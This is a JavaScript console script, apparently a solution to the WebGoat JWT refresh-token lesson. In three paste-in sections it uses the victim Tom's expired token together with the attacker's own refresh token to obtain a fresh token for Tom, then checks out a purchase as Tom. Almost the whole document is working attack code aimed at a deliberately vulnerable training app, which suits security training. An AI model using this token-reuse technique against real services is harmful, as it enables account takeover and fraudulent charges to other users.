// ═══════════════════════════════════════════════════════════
// ULTRA-SIMPLE JWT REFRESH ATTACK
// Copy ONE section at a time, paste, press Enter, wait for output
// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════
// SECTION 1: SETUP (Copy this first)
// ═══════════════════════════════════════════════════════════

console.log('%c[1] Setting up tokens...', 'color: cyan; font-weight: bold');

const TOMS_EXPIRED = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';

console.log('Tom\'s token:', TOMS_EXPIRED.substring(0, 30) + '...');
console.log('Decoded:', JSON.parse(atob(TOMS_EXPIRED.split('.')[1])));

// Check if you have your refresh token
if (window.myRefreshToken) {
    console.log('%c✓ Your refresh token is set!', 'color: green; font-weight: bold');
    console.log('Token:', window.myRefreshToken.substring(0, 30) + '...');
} else {
    console.log('%c❌ You need to set your refresh token!', 'color: red; font-weight: bold');
    console.log('Run this first:');
    console.log('   window.myRefreshToken = "PASTE_YOUR_ACTUAL_TOKEN_HERE";');
    console.log('\nThen re-run this section.');
}

// ═══════════════════════════════════════════════════════════
// SECTION 2: GET TOM'S NEW TOKEN (Copy this second, AFTER Section 1 works)
// ═══════════════════════════════════════════════════════════

console.log('%c[2] Requesting Tom\'s new token...', 'color: cyan; font-weight: bold');

fetch('/WebGoat/JWT/refresh/newToken', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + TOMS_EXPIRED,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ refresh_token: window.myRefreshToken })
})
.then(r => {
    console.log('Response status:', r.status, r.statusText);
    if (!r.ok) {
        throw new Error('HTTP ' + r.status);
    }
    return r.json();
})
.then(data => {
    console.log('%c✅ Got response!', 'color: green; font-weight: bold');
    console.log('Data:', data);
    
    if (data.access_token) {
        window.tomsNewToken = data.access_token;
        console.log('%c✅ Tom\'s new token saved!', 'color: green; font-size: 16px; font-weight: bold');
        
        const decoded = JSON.parse(atob(data.access_token.split('.')[1]));
        console.log('User in token:', decoded.user);
        
        if (decoded.user === 'Tom') {
            console.log('%c✅ SUCCESS! Token has user=Tom!', 'color: white; background: green; padding: 5px; font-weight: bold');
            console.log('\n%cNow run SECTION 3 to checkout!', 'color: yellow; font-weight: bold');
        } else {
            console.log('%c⚠️ Token has user=' + decoded.user, 'color: orange; font-weight: bold');
        }
    } else {
        console.log('%c⚠️ No access_token in response', 'color: orange');
    }
})
.catch(err => {
    console.log('%c❌ Error:', 'color: red; font-weight: bold', err.message);
    console.log('Full error:', err);
});

// ═══════════════════════════════════════════════════════════
// SECTION 3: CHECKOUT AS TOM (Copy this third, AFTER Section 2 succeeds)
// ═══════════════════════════════════════════════════════════

console.log('%c[3] Checking out as Tom...', 'color: cyan; font-weight: bold');

if (!window.tomsNewToken) {
    console.log('%c❌ Tom\'s token not found!', 'color: red; font-weight: bold');
    console.log('Run SECTION 2 first to get Tom\'s token.');
} else {
    fetch('/WebGoat/JWT/refresh/checkout', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + window.tomsNewToken,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        }
    })
    .then(r => {
        console.log('Checkout status:', r.status);
        return r.json();
    })
    .then(data => {
        console.log('Checkout response:', data);
        
        if (data.lessonCompleted) {
            console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS!', 'color: white; background: green; font-size: 20px; font-weight: bold; padding: 10px');
            console.log('Tom\'s wallet: -$31.53 💰');
            console.log('Challenge: COMPLETE ✅');
        } else {
            console.log('%c⚠️ Lesson not completed', 'color: orange; font-weight: bold');
            console.log('Feedback:', data.feedback);
        }
    })
    .catch(err => {
        console.log('%c❌ Checkout error:', 'color: red; font-weight: bold', err.message);
    });
}
